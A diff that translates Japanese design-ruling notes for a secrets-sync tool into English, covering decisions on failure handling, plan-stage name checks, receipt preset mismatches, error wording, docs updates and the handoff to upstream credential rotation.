-対象は SY5 申し送り (3) = SY4 申し送り (3) の 3 点(`describeDestination` の一般化・`runBatches` の「refused」の誤用・exec の
-`runInvocations` の起動失敗の畳み)+ SY5 で見つけた 2 点(plan の名前検査・大小衝突の集合検査の裁定)。**所有者裁定(セッションの
-プロンプトで確定)**: (a) `sync-plan.ts` の変更を承認(SY2 第 1 段以来の「触らない前提」を解除)、(b) ROADMAP の SY4 を「第 1 波 =
-Netlify で完了扱い、残り候補は需要駆動」として `- [x]`、SY 系列の親項目も `- [x]`。仕様改訂・依存追加・新プリセット・レシート /
-設定形式の版上げは無し。各裁定点は同じループ(3 案以上 → 上位互換の探索 → 新案が出ない周で終了 → 理由付きで選定)で決め、
-「新案なし」の周では壊れ方(1 つ目の起動失敗でレシートを書かない規律・`blocked` と `delete` の同居・rename `foo` → `FOO` の
-大小畳み delete・`describe` に秘密が載らないか・`ci sync` / push 直後の同じ経路・既存テストの文面固定)を問うた。
+The target is SY5 handoff (3) = SY4 handoff (3)'s 3 items (generalizing `describeDestination`, the misused `runBatches` "refused", exec's `runInvocations` start-failure folding) + the 2 found in SY5 (the plan-side name check, the case-collision set check). **Owner ruling (settled in the session prompt)**: (a) approve modifying `sync-plan.ts` (lifting the "don't touch" premise held since SY2 stage 1); (b) mark ROADMAP's SY4 `- [x]` as "wave 1 = Netlify counts as complete; remaining candidates demand-driven", and the SY family's parent item `- [x]` too. No spec revision, no dependency additions, no new presets, no receipt / config-format version bump. Each ruling point was decided by the same loop (3+ options → search for a superset → end on a no-new-option round → choose with reasons), and on "no new option" rounds we asked about failure modes (the no-receipt-write-on-first-start-failure discipline, `blocked` and `delete` cohabiting, a rename `foo` → `FOO`'s case-folded delete, whether a secret could ride `describe`, the same path right after `ci sync` / push, wording pinned by existing tests).
 
-**前提の確認(コードで確かめた事実 — 2026-09-08)**: (1) `classifyVariable`(sync-plan.ts)は `nonEmpty` / `maxBytes` だけを見て、
-SY5 の `constraints.name` は apply の `prepareWork` → `checkValueConstraints`(sync-exec.ts)でしか検査されない = 小文字名は
-`plan` で `+` に見え `apply --yes` で「Nothing was sent」(pullfrog が #160 で 2 度指摘)。(2) `describeDestination` は
-`options.environment` しか見ない(Netlify の `context`・gh の `repo` / `app` はヘッダー行に出ない)。(3) `runBatches` の
-`failure.what` は常に `${label} refused the request`(429 / 5xx × 3 の試行の使い切りにも付く — SY4 改訂 5 の nit)。
-(4) `runInvocations` は `runner.exec` の型付きエラー(`CliError` — live.ts の `execStartFailure`)で `Effect.gen` ごと中断し、
-それまでに届いた名前が `written` / `deleted` に畳まれずレシートに残らない(http は SY4 改訂 5 で `runBatch` = `never` 済)。
-(5) 偽 `ProcessRunner` の `setExecHandler` は `ExecOutcome | CliError` を返せる(第 3 段前提 (7))— 「2 つ目の起動が失敗」の態は
-support の変更なしに書ける(sync-command.test.ts の「偽ランナーは起動失敗を表現できない」というコメントは古かった → 削除)。
-(6) `computePlan` は `selected` と `previous`(レシート)の両方を持つ = 集合の検査を置ける唯一の場所(裁定 E の入力)。
-(7) `ci sync` も `reviewPlan` を通る(`receipt: null` で計画し `{kind: "none-in-ci"}` で見直す — `blocked` の検査は同じ)= plan の
-名前検査は CI 経路にも効く。
+**Premise verification (facts confirmed in the code — 2026-09-08)**: (1) `classifyVariable` (sync-plan.ts) looks only at `nonEmpty` / `maxBytes`; SY5's `constraints.name` is checked only by apply's `prepareWork` → `checkValueConstraints` (sync-exec.ts) = a lowercase name shows `+` on `plan` then "Nothing was sent" on `apply --yes` (pullfrog pointed this out twice in #160). (2) `describeDestination` looks only at `options.environment` (Netlify's `context`, gh's `repo` / `app` don't reach the header line). (3) `runBatches`' `failure.what` is always `${label} refused the request` (it also attaches to retry exhaustion after 429 / 5xx × 3 — SY4 revision 5's nit). (4) `runInvocations` aborts the whole `Effect.gen` on `runner.exec`'s typed error (`CliError` — live.ts's `execStartFailure`), and names delivered up to that point never get folded into `written` / `deleted`, never landing on the receipt (http's `runBatch` = `never` was already done in SY4 revision 5). (5) The fake `ProcessRunner`'s `setExecHandler` can return `ExecOutcome | CliError` (stage-3 premise (7)) — the "second launch fails" case can be written with no support changes (sync-command.test.ts's comment "the fake runner can't express a start failure" was stale → deleted). (6) `computePlan` holds both `selected` and `previous` (the receipt) = the only place a set-wide check can sit (input to ruling E). (7) `ci sync` also goes through `reviewPlan` (plans with `receipt: null`, reviewed as `{kind: "none-in-ci"}` — the `blocked` check is the same) = plan's name check also applies on the CI path.
 
-**D. `runInvocations` の起動失敗の畳み(最初に確定 — 失敗の方向)** — 列挙: (i) **`runInvocations` の中で `runner.exec` を
-`Effect.catch` し、その呼び出しの失敗として `DriverResult` に返す(失敗型 = `never`。http の `runBatch` と同じ形)** / (ii) 呼び出しの
-外側で `Effect.either` に包み分岐 / (iii) `ProcessRunner.exec` 自体を `never` にして `ExecOutcome` に起動失敗の口を足す。第 1 周の
-新案: なし。第 2 周(壊れ方): (iii) は `run` にも効く広い変更で、exec の全呼び手の意味が変わる(スコープ外)。(ii) は畳む場所が
-ループの外に出て `written` / `deleted` のローカル状態から離れ、同じ畳みをもう 1 段書く。(i) は「型付きエラーで先に届いた分が
-レシートから消える」形が**型から**消える(`DriverResult` の失敗型 = `never`)。選定 = **(i)**。`what` =
-`${command} could not be started`(`execStartFailure` の「Cannot start …: install it …」は完成した文で、`failDriver` の
-「… while writing X」と繋げると読めないため、`CliError.message` は `output` に置いてベンダー出力と同じ場所で見せる — 値は運ばない)。
-付随裁定: `failDriver` の「Its output is shown above with values filtered out.」は `output` が空のとき言わない(嘘になる)。
-1 つ目の起動失敗 = `written` / `deleted` が空 → `sameVariables` でレシートを書かない既存規律がそのまま成立(態で固定)。
-`sync-push` 経路は `asCleanupOutcome` で警告・終了コード 0 のまま(態を更新)、`ci sync` はレシート無しで同じ `failDriver` の文面
-(態を追加)。棄却: (ii)(重複した畳み)、(iii)(スコープ外)。
+**D. `runInvocations`'s start-failure folding (decided first — failure direction)** — enumeration: (i) **`Effect.catch` `runner.exec` inside `runInvocations` and return it as that call's failure on `DriverResult` (failure type = `never`. Same shape as http's `runBatch`)** / (ii) wrap the call site in `Effect.either` and branch / (iii) make `ProcessRunner.exec` itself `never` and add a start-failure leg to `ExecOutcome`. Round-1 new option: none. Round 2 (failure modes): (iii) is a broad change also affecting `run`; every `exec` caller's meaning changes (out of scope). (ii) pushes the fold outside the loop, away from `written` / `deleted`'s local state, writing the same fold a second level deep. (i) makes "the delivered-so-far portion disappears from the receipt on a typed error" disappear **from the type** (`DriverResult`'s failure type = `never`). Chosen = **(i)**. `what` = `${command} could not be started` (`execStartFailure`'s "Cannot start …: install it …" is a complete sentence and wouldn't read after `failDriver`'s "… while writing X", so `CliError.message` goes on `output` shown where vendor output goes — carries no values). Adjunct ruling: `failDriver`'s "Its output is shown above with values filtered out." isn't said when `output` is empty (it'd be a lie). A first-launch failure = empty `written` / `deleted` → the existing don't-write-the-receipt discipline via `sameVariables` holds as-is (pinned by a case). The `sync-push` path stays a warning with exit code 0 via `asCleanupOutcome` (case updated); `ci sync` gets the same `failDriver` wording with no receipt (case added). Rejected: (ii) (duplicate folding), (iii) (out of scope).
 
-**A. plan の名前検査の置き場(D の次)** — 列挙: (i) **`classifyVariable` に `constraints.name` の分岐を足す(理由 =
-`constraints.name.rule` をそのまま)** / (ii) `SourceVariable` に `nameProblem` を事前計算して載せる / (iii) `checkNameConstraints`
-を sync-exec.ts に切り出し、plan と apply が同じ関数を呼ぶ。第 1 周の新案: なし。第 2 周(壊れ方): (ii) は `SourceVariable` の
-作り手(通常 / CI の 2 か所)に検査が散り、plan の判定が入力の作り方に依存する。(iii) は関数を共有しても呼び出しの形が違い
-(plan = `PlanEntry`、apply = 型付きエラー)、共有できる本体は `regex.test` の 1 行 = 切り出しの得が無い。二重管理の懸念は
-「規則の正が `constraints.name`(宣言)1 か所」で消えている — plan と apply のどちらの検査も同じ宣言を読む(ベンダー固有の分岐を
-sync-plan.ts に足さない規律も保たれる: 分岐は宣言の有無だけ)。選定 = **(i)**。理由文 =
-`a name ${driverLabel} cannot store as is: ${constraints.name.rule}`(**名前と規則だけを運ぶ** — 値・環境・オプションは載せない)。
-`reviewPlan` の失敗文に「rename them」を足し、複数の理由が混在しても行が言うよう「(each line above says which)」を添えた。
-apply の `checkValueConstraints` は防衛線として据え置き(plan と apply の一致: 平文の要らない制約〔空・サイズ・名前〕は plan、
-平文の要る制約〔UTF-8・末尾改行〕は apply)。docs の「`plan` does not mark such a name yet」の 1 文は削除。棄却: (ii)(検査の分散)、
-(iii)(共有の実体が無い)。
+**A. Where plan's name check lives (after D)** — enumeration: (i) **add a `constraints.name` branch to `classifyVariable` (reason = `constraints.name.rule` as-is)** / (ii) precompute `nameProblem` and carry it on `SourceVariable` / (iii) extract `checkNameConstraints` into sync-exec.ts and call the same function from plan and apply. Round-1 new option: none. Round 2 (failure modes): (ii) scatters the check across `SourceVariable`'s makers (2 places, normal / CI), making plan's judgment depend on how the input was built. (iii): even sharing the function, the call shapes differ (plan = `PlanEntry`, apply = typed error); the shareable body is one `regex.test` line = no gain from extracting. The double-management concern is already dissolved by "the rule's single source of truth is `constraints.name` (the declaration), one place" — both plan's and apply's checks read the same declaration (the discipline of never adding a vendor-specific branch to sync-plan.ts is also preserved: the branch is only on the declaration's presence). Chosen = **(i)**. The reason text = `a name ${driverLabel} cannot store as is: ${constraints.name.rule}` (**carries only the name and the rule** — no value, environment, or options). `reviewPlan`'s failure message gained "rename them", plus "(each line above says which)" so the line says so even when multiple reasons mix. apply's `checkValueConstraints` stays as a defense line (plan/apply split: constraints needing no plaintext〔empty / size / name〕go to plan; plaintext-needed constraints〔UTF-8 / trailing newline〕stay on apply). docs' "`plan` does not mark such a name yet" line is deleted. Rejected: (ii) (scattered checks), (iii) (no shareable body exists).
 
-**E. 大小衝突の集合検査(大文字限定を緩めるか — A と同時に確定)** — 列挙: (i) **据え置き**(大文字限定 = 1 変数ずつの検査で衝突が
-構造的に起きない。小文字名は「rename せよ」)/ (ii) `constraints.name` に `foldCase` を足し、plan で選択同士・選択 × レシート
-(削除)を畳んで衝突を `blocked` にし、regex から大文字限定を外す(小文字名も通る)/ (iii) 緩めるが衝突は apply でだけ止める。
-第 1 周の新案: なし。第 2 周(壊れ方): (iii) は plan と apply の非対称 = 今回消す方向の逆で即棄却。(ii) は rename `foo` → `FOO` の
-`+ FOO` と `- foo` の同居に解が要る — 削除を落として update に読み替えれば独自の `if` が暗黙の規則(delete はレシートの名前どおり)
-を置き換え、`blocked` にすれば rename が二段階になる。さらに `maruhi run` は大小違いの同居を既に拒む(Windows の環境変数)ので、
-(ii) が通せるようになる名前の実益が小さい。(i) は SY5 裁定 C の理由(無言の破壊を構造で塞ぐ)がそのまま生きており、A で plan の
-`!` になったことで「apply まで気づけない」という UX の穴も塞がった。選定 = **(i) 据え置き**。**`blocked` と `delete` の同居**
-(レシートに今の規則で不正な名前)は**削除だけ通す**: 削除は値を運ばず、gh の不正名 delete は 404 → `failDriver` のレシート
-作り直しの案内が既に当たる。不正な名前が gh ターゲットのレシートに居るのは**プリセットを切り替えた場合だけ**(apply は不正名を
-記録する前に止まる)で、その場合は削除自体が別プラットフォーム由来 = 名前規則の問題ではない。初稿は「レシートは preset を
-記録しない」を前提に docs のリセット案内へ委ねたが、これは誤認(`SyncReceipt.preset` は存在し `decodeReceipt` が検証もして
-いた — pullfrog 指摘)で、**改訂 1 で `loadReceipt` が preset の不一致を名指しで拒む形にした**(下の改訂 1 (1))。棄却:
-(ii)(rename の同居に良い解が無く実益が小さい)、(iii)(非対称)。
+**E. The case-collision set check (loosen the uppercase-only rule? — decided with A)** — enumeration: (i) **keep as-is** (uppercase-only = collisions structurally can't happen under per-variable checks. Lowercase names get "rename them") / (ii) add `foldCase` to `constraints.name`, fold selection-vs-selection and selection × receipt (deletes) on plan into `blocked`, and drop uppercase-only from the regex (lowercase names pass) / (iii) loosen it but stop collisions only on apply. Round-1 new option: none. Round 2 (failure modes): (iii) is a plan/apply asymmetry = the opposite of what we're removing this time; rejected immediately. (ii) needs a resolution for the cohabitation of rename `foo` → `FOO`'s `+ FOO` and `- foo` — reading the delete as an update replaces a built-in `if` with an implicit rule (delete follows the receipt's names); as `blocked`, a rename becomes two-stage. Further, `maruhi run` already refuses case-differing cohabitation (Windows env vars), so (ii)'s newly-admitted names have small real value. (i): SY5 ruling C's reason (structurally closing silent destruction) still holds, and with A making it `!` on plan, the UX hole "can't notice until apply" is also closed. Chosen = **(i) keep as-is**. **Cohabiting `blocked` and `delete`** (a name now-illegal under current rules on the receipt): **only the delete goes through** — a delete carries no value, and an illegal-name delete on gh is a 404 → the existing `failDriver` receipt-rebuild guidance applies. An illegal name sits on a gh target's receipt **only when the preset was switched** (apply stops before recording illegal names), in which case the delete itself originates from another platform = not a name-rule problem. The first draft assumed "the receipt doesn't record a preset" and delegated to docs' reset guidance — that was a misread (`SyncReceipt.preset` exists and `decodeReceipt` even validates it — pullfrog's catch), and **revision 1 made `loadReceipt` refuse a preset mismatch by name** (revision 1 (1) below). Rejected: (ii) (no good resolution for rename cohabitation, small real value), (iii) (asymmetry).
 
-**B. `describeDestination` の一般化** — 列挙: (i) `SyncPreset.describe?: (options) => string`(関数 — `isProduction` と同じ置き場)
-/ (ii) **`ExecPreset` / `HttpPreset` に `describeOptions: readonly string[]`(載せるオプション名の宣言 — データ)** / (iii) 全
-オプションを `k=v` で並べる。第 1 周の新案: なし。第 2 周(壊れ方): (iii) は boolean(`sensitive` / `secret`)や不透明な ID
-(`projectId` / `accountId` / `siteId`)まで並んで冗長。(i) は関数 = プリセットごとに文の組み立てを再発明し、宣言的プリセットの
-規律(データで表す)から一歩出る — `isProduction` が関数なのは**判定**だから。呼び名は「どのオプションをどの順で並べるか」だけ =
-データで足りる。(ii) は宣言順に、設定されている**文字列の値だけ**を並べる(boolean は型で落ちる)。トークン系は options に
-そもそも無く、ID 系は宣言に載せないことで冗長さも秘密の面も増やさない。選定 = **(ii)**。宣言: exec = workers `[name, environment]`
-/ vercel `[project, environment, gitBranch]` / gh `[repo, environment, app]`、http = workers `[name, environment]` / vercel
-`[environment, gitBranch]` / netlify `[context, branch]`。既存の文面「vercel production via exec」は `environment` を宣言に
-含めることで不変(既存テストは修正なしで通る)。棄却: (i)(データで足りるのに関数)、(iii)(冗長・非文字列が混ざる)。
+**B. Generalizing `describeDestination`** — enumeration: (i) `SyncPreset.describe?: (options) => string` (a function — same home as `isProduction`) / (ii) **`ExecPreset` / `HttpPreset` get `describeOptions: readonly string[]` (a declaration of which option names to carry — data)** / (iii) list every option as `k=v`. Round-1 new option: none. Round 2 (failure modes): (iii) lists booleans (`sensitive` / `secret`) and opaque IDs (`projectId` / `accountId` / `siteId`) — redundant. (i) is a function = reinventing sentence assembly per preset, one step out of the declarative-preset discipline (express as data) — `isProduction` is a function because it's a **judgment**. A display name only needs "which options in which order" = data suffices. (ii) lists in declaration order, only **string-valued** options that are set (booleans drop out by type). Token-ish things aren't options to begin with; ID-ish things aren't put on declarations — neither redundancy nor secret exposure grows. Chosen = **(ii)**. Declarations: exec = workers `[name, environment]` / vercel `[project, environment, gitBranch]` / gh `[repo, environment, app]`; http = workers `[name, environment]` / vercel `[environment, gitBranch]` / netlify `[context, branch]`. The existing wording "vercel production via exec" is unchanged by including `environment` in the declaration (existing tests pass unmodified). Rejected: (i) (a function where data suffices), (iii) (redundant, mixes non-strings).
 
-**C. 「refused the request」の文言** — 列挙: (i) **`HttpRequestResult.failure` に `what` を持たせ、失敗の作り手が言い分ける** /
-(ii) `runBatches` が `lines` の先頭から推定 / (iii) 中立な文言に一本化(「did not accept the request」)。第 1 周の新案: なし。
-第 2 周(壊れ方): (ii) は `lines` の形式への暗黙依存 = 伏せ字化や文面の変更で黙って壊れる。(iii) は「送ってすらいない」場合
-(ページ分けガード・Netlify の `is_secret` 更新ガード)にも accept 系の語が付き、誤読が残る。(i) は失敗を作る場所が
-何が起きたかを知っている。選定 = **(i)**。5 文型(初稿は 4 文型で一覧の失敗を「未送信」に含めていた — 改訂 1 (2) で分離):
-`${label} refused the request`(非 2xx の拒否)/ `${label} did not confirm the write`(2xx だが応答の形が予期と違う)/
-`the request to ${label} failed`(転送の失敗・リトライの使い切り — `runBatch` / `writeOneByOne` の `Effect.catch`)/
-`${label} did not list the existing variables`(一覧の失敗 — 応答は返っている)/ `maruhi did not send the request`
-(送信前のガード — ページ分けガード・Netlify の `is_secret` 更新ガード)。`sync-http.test.ts` の文面固定は新文言に更新
-(リトライ使い切り = 「the request to … failed」、Netlify の更新ガード = 「maruhi did not send the request」、一覧 401 =
-「did not list the existing variables」)。棄却: (ii)(脆い)、(iii)(誤読が残る)。
+**C. The "refused the request" wording** — enumeration: (i) **let `HttpRequestResult.failure` carry `what`, so the failure's maker chooses the wording** / (ii) `runBatches` infers from `lines`' head / (iii) unify into one neutral wording ("did not accept the request"). Round-1 new option: none. Round 2 (failure modes): (ii) is an implicit dependency on `lines`' format = silently breaks under redaction or wording changes. (iii) attaches an accept-flavored word even to "was never even sent" cases (the pagination guard, Netlify's `is_secret` update guard) — the misreading remains. (i) = the place that creates the failure knows what happened. Chosen = **(i)**. 5 sentence forms (the first draft had 4, lumping listing failures into "not sent" — separated in revision 1 (2)): `${label} refused the request` (a non-2xx refusal) / `${label} did not confirm the write` (2xx but the response shape is unexpected) / `the request to ${label} failed` (transport failure / retries exhausted — `runBatch` / `writeOneByOne`'s `Effect.catch`) / `${label} did not list the existing variables` (a listing failure — a response did come back) / `maruhi did not send the request` (a pre-send guard — the pagination guard, Netlify's `is_secret` update guard). `sync-http.test.ts`'s pinned wordings were updated to the new ones (retries exhausted = "the request to … failed", Netlify's update guard = "maruhi did not send the request", a listing 401 = "did not list the existing variables"). Rejected: (ii) (fragile), (iii) (a misreading remains).
 
-**F. ROADMAP と裁定録** — 所有者裁定 (b) のとおり SY4 行と親項目を `- [x]` に(SY4 = 第 1 波完了扱いの注記付き)。この節が裁定録。
+**F. ROADMAP and ruling record** — per owner ruling (b), the SY4 row and the parent item became `- [x]` (SY4 noted as wave-1-counts-as-complete). This section is the ruling record.
 
-**G. docs** — deploy-targets: `!` の定義に名前を足し「each line says which」と plan / apply の検査の分担(平文の要る規則は apply)
-を 1 文で、ヘッダー行(同期先の呼び名)の説明を追加、「GitHub Actions secrets」節の「`plan` does not mark such a name yet」を
-削除して `!` の記述へ、Receipts に「失敗した apply も届いた分を記録する(両ドライバ — 起動できなかった場合も)」を追記。
-github-actions.mdx: 「What can go wrong」の名前の項を「plan が `!` で先に示す」形へ。```sh は増やしていない(recipes.test.ts の
-禁止パターンの対象は不変)。
+**G. docs** — deploy-targets: `!`'s definition gained names, with "each line says which" and the plan / apply check split (plaintext-needed rules live on apply) in one sentence; a description of the header line (the destination's display name) was added; the "GitHub Actions secrets" section's "`plan` does not mark such a name yet" was deleted in favor of the `!` description; Receipts gained "a failed apply still records the delivered portion (both drivers — including when it couldn't launch)". github-actions.mdx: "What can go wrong"'s name item changed to the "plan shows it first via `!`" shape. No ```sh was added (recipes.test.ts's
+forbidden-pattern targets are unchanged).
 
-**改訂 1(2026-09-08 — pullfrog の初回レビュー。3 点 + 追認 1 点)**:
-(1) **preset 切り替えの検出**: 裁定 E の初稿の前提「レシートは preset を記録しない」は誤認 — `SyncReceipt.preset` は存在し
-`decodeReceipt` が既知 preset であることを検証もしていた(ただし**ターゲットの preset と突合していなかった**)。加えて、名前
-検査を plan に入れたことで「別 preset のレシートに残る名前が今の規則で不正・選択にも居て版も一致」の場合が unchanged(旧:
-apply の `prepareWork` は add / update しか検査しない = 通っていた)から blocked に変わり、「昨日まで通っていたターゲットが
-名前規則のエラーで止まる」という読み違いを生む形だった(pullfrog の主指摘)。→ `loadReceipt` に期待 preset を渡し、
-`receipt.preset` と不一致なら「preset X が書いたレシートで、届け先が別。`maruhi var rm …` で作り直し」の型付きエラーで止める
-(plan / apply / rotate 共通。exec ⇄ http のドライバ切り替えは同じ preset id なので従来どおり通る)。態: vercel が書いた
-レシート + github-actions ターゲット + 不正名が届いた版のまま選択に居る形で、名前規則でなくレシートの取り違えとして止まる
-ことを固定。docs(Receipts)にも 1 文追記。
-(2) **一覧の失敗の `what`**: `fetchListing` の失敗は応答が返っている(lines が「HTTP 401 while listing variables at the
-target」)のに「maruhi did not send the request」を付けていた(createOrUpdate / lookupAndRemove の 2 か所)→
-`${label} did not list the existing variables` に(裁定 C の 4 文型 → 5 文型)。態: Netlify の一覧 401 で固定(従来は
-lines だけ固定で `what` は未固定だった)。
-(3) **起動失敗の帰属**: `CliError.message` を `output`(ベンダー出力の置き場 — `failDriver` が実行体名の接頭辞で見せ
-「Its output is shown above」と言う)に置いていた = 走らなかったプロセスの「出力」と呼ぶ不誠実(裁定 D で足した空 output
-ガードと同種の問題の言い残し)→ `DriverResult.failure.detail`(maruhi 自身の説明 — 完成した文)を追加し、本文の続きとして
-見せる。`output` は空になり、接頭辞行も「shown above」も出ない。
-(追認)`ci sync` の名前検査に新しい態は足していない: CI はレシート無し(`receipt: null`)= 全選択が add なので、旧来の
-apply 段 `checkValueConstraints` でも同じ変数で止まっていた。plan 段の検査は CI では「同じ結果に早く着く」だけで新しい網では
-ない(将来の読者が「CI の網も今回増えた」と誤読しないための記録)。
+**Revision 1 (2026-09-08 — pullfrog's first review. 3 points + 1 ratification)**:
+(1) **Detecting a preset switch**: ruling E's first draft's premise "the receipt doesn't record a preset" was a misread — `SyncReceipt.preset` exists and `decodeReceipt` even validated it was a known preset (but **it wasn't being compared against the target's preset**). On top of that, putting the name check into plan changed the case "a name left on another preset's receipt is illegal under current rules, is in the selection, and its version matches" from unchanged (previously: apply's `prepareWork` only checks add / update = it passed) to blocked, creating the misread "a target that worked until yesterday stops on a name-rule error" (pullfrog's main point). → `loadReceipt` now takes the expected preset, and on mismatch with `receipt.preset` it stops with a typed error "a receipt written by preset X; the destination differs. Rebuild it with `maruhi var rm …`" (common to plan / apply / rotate. An exec ⇄ http driver switch keeps the same preset id, so it still passes). Case pinned: a vercel-written receipt + a github-actions target + the illegal name still in the selection at its delivered version → stops as a receipt mix-up, not a name rule. docs (Receipts) also gained a sentence.
+(2) **The listing failure's `what`**: a `fetchListing` failure has a response (lines say "HTTP 401 while listing variables at the target") yet got "maruhi did not send the request" (in 2 places: createOrUpdate / lookupAndRemove) → now `${label} did not list the existing variables` (ruling C's 4 forms → 5 forms). Case: pinned by a Netlify listing 401 (previously only lines were pinned; `what` was unpinned).
+(3) **Where the start failure is attributed**: `CliError.message` was being placed on `output` (the vendor-output slot — `failDriver` shows it with the executable-name prefix and says "Its output is shown above") = calling a never-run process's "output" is dishonest (a leftover of the same kind of problem ruling D's empty-output guard fixed) → added `DriverResult.failure.detail` (maruhi's own explanation — a complete sentence) shown as a continuation of the body. `output` is now empty, and neither the prefix line nor "shown above" prints.
+(Ratification) `ci sync`'s name check got no new cases: CI has no receipt (`receipt: null`) = every selection is an add, so it already stopped on the same variables at the old apply-stage `checkValueConstraints`. The plan-stage check on CI is only "reaching the same result sooner", not a new net (a record so future readers don't misread "CI's net also grew this time").
 
-**改訂 2(2026-09-08 — pullfrog の再レビュー。1 点 + nit 2 点)**:
-(1) **preset 不一致エラーに旧届け先の変数名を列挙**: 改訂 1 (1) の拒否文は「`var rm` で作り直し」で終わっていたが、この
-レシートの `{name → version}` は**旧プラットフォームに何が居るかの唯一の記録**で、ガードが `loadReceipt` の中で発火する以上
-plan の一覧も出ない = 消させたら運用者は届いた名前を maruhi から知る手段を失う(pullfrog 指摘)。裁定: 旧届け先の掃除は
-運用者の作業(maruhi は設定が今指していない先に書く・消すことはしない — 触らない方針は据え置き)だが、唯一の記録を黙って
-捨てさせない。→ 拒否文に `driverFailureMessage` の `pendingHint` と同型の 1 文「Those deliveries stay at the ${preset}
-destination and this receipt is their only record, so remove them there yourself first: <names>」を追加(`decoded.variables`
-のキーをソートして列挙。変数ゼロのレシートでは省く)。棄却: 旧届け先を maruhi が消しに行く(設定が指していない先への操作 =
-新しい危険面。しかも旧 preset の資格情報がもう無いのが普通)・docs だけに書く(エラーを読む瞬間に名前が要る)。docs は
-deploy-targets の Receipts に「レシート削除は忘れるだけで、プラットフォームからは何も消えない — 同一届け先の作り直しでは
-それで良く、preset 切り替えでは旧届け先に全部残る」を追記し、http 節の preset 切り替えの文も「エラーが名前を列挙する。先に
-旧プラットフォームで消してから作り直す」に更新。
-(2) nit: `HttpRequestResult.failure.what` の JSDoc の文型列挙が 4 のまま(改訂 1 (2) で 5 文型)→ 5 文型に。
-(3) nit: 裁定 C の本文が「一覧の失敗」を「maruhi did not send the request」の側に残したまま(改訂 1 (2) と矛盾)→ 裁定 C
-自体を 5 文型に書き換え(初稿が 4 文型だった旨は裁定 C に注記)。
+**Revision 2 (2026-09-08 — pullfrog's re-review. 1 point + 2 nits)**:
+(1) **List the old destination's variable names in the preset-mismatch error**: revision 1 (1)'s refusal ended at "rebuild with `var rm`", but this receipt's `{name → version}` is **the only record of what lives on the old platform**, and since the guard fires inside `loadReceipt`, even plan's listing never prints = deleting it robs the operator of any way to learn the delivered names from maruhi (pullfrog's point). Ruling: cleaning the old destination is the operator's job (maruhi won't write to or delete from somewhere the config no longer points at — the hands-off policy stands), but the only record isn't silently discarded. → the refusal gained a sentence in the same shape as `driverFailureMessage`'s `pendingHint`: "Those deliveries stay at the ${preset} destination and this receipt is their only record, so remove them there yourself first: <names>" (`decoded.variables`'s keys sorted and listed. Omitted on a zero-variable receipt). Rejected: maruhi going to delete at the old destination (operating on a place the config doesn't point at = a new danger surface; and typically the old preset's credentials are already gone); writing it only in docs (the names are needed at the moment the error is read). docs: deploy-targets' Receipts gained "deleting the receipt only forgets; nothing is removed from the platform — fine when rebuilding for the same destination, but on a preset switch everything remains at the old destination", and the http section's preset-switch sentence was updated to "the error lists the names. Delete them on the old platform first, then rebuild".
+(2) nit: `HttpRequestResult.failure.what`'s JSDoc still enumerated 4 forms (5 since revision 1 (2)) → 5 forms.
+(3) nit: ruling C's body still left "listing failure" on the "maruhi did not send the request" side (contradicting revision 1 (2)) → ruling C itself rewritten to 5 forms (a note on ruling C records that the first draft had 4).
 
-**確認できなかったこと(人間タスク)**: 増減なし — 今回の変更はすべて偽ベンダー / 偽 API(`setExecHandler` の `CliError`・
-`MockServer`)で検証できる形で、SY5 の一覧(実リポジトリでの `gh secret set` の通し等)を据え置く。
+**Could not confirm (human tasks)**: no change — every change this round is verifiable against the fake vendor / fake API (`setExecHandler`'s `CliError`, `MockServer`), so SY5's list (running `gh secret set` on a real repo, etc.) stays.
 
-**次への申し送り(SY 系列 完了)**: (1) 入れ子 `maruhi ci run --env tokens -- maruhi ci sync <target>`(SY5 申し送り (1))は
-未検証のまま。(2) SY4 の残り候補(Railway / Render / Fly.io / Deno Deploy / Supabase / Cloudflare Pages)は需要駆動(1 プリセット
-1 PR)。(3) 組織 secrets(`--org` / `--visibility` / `--repos`)は需要が出たら裁定(権限モデルが別)。(4)
-`actions/create-github-app-token` への差し替え手順は実機で通してから docs に。(5) 実機の人間タスクは SY5 の一覧のまま。
-**SY 系列はこれで閉じ、ROADMAP の順序では次 = H4 法務**(ToS / プライバシーポリシー / AUP・サブプロセッサ整理・security@ 窓口・
-ステータスページ・アカウント削除〔gap 6〕・通知経路〔gap 8〕・法務文書の配信面 = web の未認証静的ページ〔hosted-design.md §9〕。
-人間タスクの列挙は hosted-design.md §7)。同期まわりから H4 へ渡す事実: 同期先プラットフォーム(Vercel / Cloudflare / Netlify /
-GitHub)は**サブプロセッサではない**(ユーザーが自分のアカウントへ自分の資格で書く。maruhi のサーバーは値に触れない)、レシートは
-E2EE でサーバーは読めない、テレメトリ・外部送信は無い — プライバシーポリシーの「maruhi が見られないもの」の節にそのまま使える。
+**Handoff to what's next (SY family complete)**: (1) Nested `maruhi ci run --env tokens -- maruhi ci sync <target>` (SY5 handoff (1)) stays unverified. (2) SY4's remaining candidates (Railway / Render / Fly.io / Deno Deploy / Supabase / Cloudflare Pages) are demand-driven (1 preset = 1 PR). (3) Org secrets (`--org` / `--visibility` / `--repos`) get a ruling when demand appears (a different permission model). (4) The swap procedure to `actions/create-github-app-token` goes into docs after a real-machine run. (5) Real-machine human tasks stay as SY5's list. **The SY family closes here; next in ROADMAP order = H4 legal** (ToS / privacy policy / AUP, subprocessors list, a security@ contact, a status page, account deletion〔gap 6〕, notification routes〔gap 8〕, legal-document distribution = web's unauthenticated static pages〔hosted-design.md §9〕. The human-task enumeration is hosted-design.md §7). Facts handed from the sync work to H4: the destination platforms (Vercel / Cloudflare / Netlify / GitHub) are **not subprocessors** (the user writes to their own account with their own credentials; maruhi's server never touches the values), receipts are E2EE so the server can't read them, there is no telemetry or external sending — usable as-is in the privacy policy's "what maruhi can't see" section.
 
 ---
 
-## 4. 上流ローテーション
+## 4. Upstream rotation
 
-### 問題の定義
+### Problem definition
 
-「上流」とは AWS のアクセスキー、DB のパスワード、Stripe のキーなど、maruhi に入っている値の**発行元**。ローテーションは 5 工程: ① きっかけ(定期 / メンバー退出 / 漏洩疑い)→ ② 発行元で新しい資格情報を作る(発行元の管理者権限が要る)→ ③ maruhi に新しい値を**署名して**書く → ④ 使う側へ行き渡らせる(同期 / 再デプロイ)→ ⑤ 猶予後に古い資格情報を無効化。
-maruhi は ① の検出(「要ローテーション検出」)を実装済み。②③⑤ が未実装で、③ は「署名は人間だけ」という制約にぶつかる。
